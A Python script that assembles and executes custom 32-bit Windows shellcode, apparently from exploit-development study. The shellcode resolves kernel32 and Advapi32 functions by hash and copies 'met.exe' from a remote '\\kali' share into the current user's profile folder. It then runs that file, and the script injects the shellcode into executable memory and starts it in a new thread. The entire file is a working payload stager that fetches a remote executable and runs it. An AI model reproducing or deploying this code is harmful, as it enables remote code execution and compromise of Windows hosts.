#!/usr/bin/python3

import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
    
    " next_module:                      "  #
    "   mov   ebx, [esi+8h]             ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00?
    "   jne   next_module               ;"  #   No: try next module.

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #  

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage 
    "   push  0x7ee258e7                ;"  #   CopyFileExA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x1C], eax           ;"  #   Save CopyFileExA address for later usage

    "load_Advapi32.dll:                 ;"
    "   xor ecx, ecx                    ;"  # ECX = 0
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   push 0x6c6c642e                 ;"  # .dll
    "   push 0x32336970                 ;"  # pi32
    "   push 0x61766441                 ;"  # Adva
    "   push esp                        ;"  # "Advapi32.dll"
    "   call [ebp + 0x14]               ;"  # LoadLibrary("Advapi32.dll")

    " resolve_symbols_Advapi32:            "
    "   mov   ebx, eax                  ;"  #   Move the base address of Advapi32.dll to EBX
    "   push  0x5c52aa34                ;"  #   GetUserNameA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x20], eax           ;"  #   Save GetUserNameA address for later usage

    "call_GetUserNameA:                 ;"
    "   sub esp, 0x0C                   ;"  # ESP - 0x0C (12)
    "   mov edx, esp                    ;"  # ESP -> EDX
    "   mov [ebp + 0x24], edx           ;"  # [EBP + 0x24] = Username - dd poi(ebp+0x24)
    "   sub esp, 0x0C                   ;"  # ESP - 0x0C (12) - Saves another area to store the pointer
    "   mov ecx, esp                    ;"  # ESP -> ECX
    "   push ecx                        ;"  # ECX -> ESP
    "   push edx                        ;"  # EDX -> ESP
    "   call [ebp + 0x20]               ;"  # GetUserNameA

    " create_src_string:                 "  #
    "   mov   eax, 0xffff9a88           ;"  #   Move ffff9a88 into EAX
    "   neg   eax                       ;"  #   
    "   push  eax                       ;"  #  
    "   push  0x652e7465                ;"  #  
    "   push  0x6d5c7465                ;"  #  
    "   push  0x6d5c696c                ;"  #  
    "   push  0x616b5c5c                ;"  #  
    "   push  esp                       ;"  #   
    "   pop   ebx                       ;"  #   Store pointer to the "\\kali\met\met.exe" string in EBX

    " create_dst_string:                "   # 
    "   add   esp, 0xffffff04           ;"  #   reserve 252 bytes by negative value 
    "   mov   edi, esp                  ;"  #   EDI = destination buffer
    "   mov   eax, 0xffffffa4           ;"  #   mov negative \ val
    "   neg   eax                       ;"  #   negate
    "   push  eax                       ;"  #   Push \
    "   push  0x73726573                ;"  #   Push "sers"  
    "   push  0x555c3a43                ;"  #   Push "C:\U"
    "   mov   esi, esp                  ;"  #   ESI = source ("C:\Users\")
    "   xor   ecx, ecx                  ;"  #   zero out ecx
    "   mov   ecx, 0xfffffff7           ;"  #   Length of C:\Users\ = 9
    "   neg   ecx                       ;"  #   negate
    "   rep   movsb                     ;"  #   Copy C:\Users\ to buffer
    "   sub   esp, 0xfffffff4           ;"  #   clean first pushed C:\Users\ negative = 12 (with empty bytes)
    "   mov   edx, [ebp+0x24]           ;"  #   store pointer to username
    "   xor   ecx, ecx                  ;"  #   zero out ecx

    " loop:                              "    
    "   xor   eax, eax                  ;"  #   zero out eax
    "   cmp   [edx], al                 ;"
    "   je    loop_done                 ;"
    "   inc   edx                       ;"
    "   inc   ecx                       ;"
    "   jmp   loop                      ;"
    " loop_done:                         "    
    "   mov   eax, ecx                   ;"

    "   mov   eax, [ebp + 0x24]         ;"  #   'username' structure
    "   mov   esi, [ebp + 0x24]         ;"  #   ESI = username string pointer
    "   rep   movsb                     ;"  #   Copy username after C:\Users\
    "   mov   edx, 0xff9a879b           ;"  #   
    "   push  0x6578652e                ;"  #   
    "   push  0x74656d5c                ;"  #   
    "   mov   esi, esp                  ;"  #   
    "   xor   ecx, ecx                  ;"  #   zero out ecx
    "   mov   ecx, 0xfffffff8           ;"  #   negative 8 for \met.exe and
    "   neg   ecx                       ;"  #   negate
    "   rep   movsb                     ;"  #   Copy met.exe
    "   xor   eax, eax                  ;"  #   Null terminate
    "   mov   [edi], eax                ;"  #   Null terminate
    "   pop   eax                       ;"  #   remove \met from esp
    "   pop   eax                       ;"  #   remove .exe from esp
    "   mov   edx, esp                  ;"  #   EDX = pointer to complete C:\Users\Username\met.exe string
    "   mov   [ebp+0x28], esp           ;"  #   storing in filepath for createprocess

    "call_CopyFileExA:                  ;"
    "   xor   eax, eax                  ;"  #   EAX = 0 
    "   push  eax                       ;"  #   dwCopyFlags (0 = no special flags)
    "   push  eax                       ;"  #   pbCancel (NULL)
    "   push  eax                       ;"  #   lpData (NULL) 
    "   push  eax                       ;"  #   lpProgressRoutine (NULL)
    "   push  edx                       ;"  #   lpNewFileName (destination)
    "   push  ebx                       ;"  #   lpExistingFileName (source)
    "   call  dword ptr [ebp+0x1C]      ;"  #   Call CopyFileExA

    # "int3;"

    " create_startupinfoa:               "  #
    "   xor eax, eax                    ;"
    "   push eax                        ;"
    "   push  esi                       ;"  #   Push hStdError
    "   push  esi                       ;"  #   Push hStdOutput
    "   push  esi                       ;"  #   Push hStdInput
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpReserved2
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
    "   mov   eax, 0xffffff80           ;"  #   Move 0x80 to AL
    "   neg   eax                       ;"  #   negate
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   ecx, 0xffffff80           ;"  #   Move 0x80 to AL
    "   neg   ecx                       ;"  #   negate
    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
    "   push  eax                       ;"  #   Push dwFlags
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push dwFillAttribute
    "   push  eax                       ;"  #   Push dwYCountChars
    "   push  eax                       ;"  #   Push dwXCountChars
    "   push  eax                       ;"  #   Push dwYSize
    "   push  eax                       ;"  #   Push dwXSize
    "   push  eax                       ;"  #   Push dwY
    "   push  eax                       ;"  #   Push dwX
    "   push  eax                       ;"  #   Push lpTitle
    "   push  eax                       ;"  #   Push lpDesktop
    "   push  eax                       ;"  #   Push lpReserved
    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL
    "   push  eax                       ;"  #   Push cb
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI

    " create_cmd_string:                 "  #
    "   mov   ebx, [ebp+0x28]           ;"  #   Store pointer to the filepath string in EBX

    " call_createprocessa:               "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpProcessInformation
    "   push  edi                       ;"  #   Push lpStartupInfo
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpCurrentDirectory
    "   push  eax                       ;"  #   Push lpEnvironment
    "   push  eax                       ;"  #   Push dwCreationFlags
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
    "   push  eax                       ;"  #   Push bInheritHandles
    "   dec   eax                       ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpThreadAttributes
    "   push  eax                       ;"  #   Push lpProcessAttributes
    "   push  ebx                       ;"  #   Push lpCommandLine
    "   push  eax                       ;"  #   Push lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA

    "Call_TerminateProcess:             ;"
    "   xor ecx, ecx                    ;"  # EAX = 0
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
)

# init the engine in x86-32 bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoding %d instructions.." % count)

sh = b""

for e in encoding:
    if e == 0x00:
        print()
        print()
        print()
        print("Bad chars found")
        print()
        print()
        print()
    sh += struct.pack("B", e)

shellcode = bytearray(sh)

# For printing OPCODEs
instructions = ""
for dec in encoding: 
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("Opcodes = (\"" + instructions + "\")")
  
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
# input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
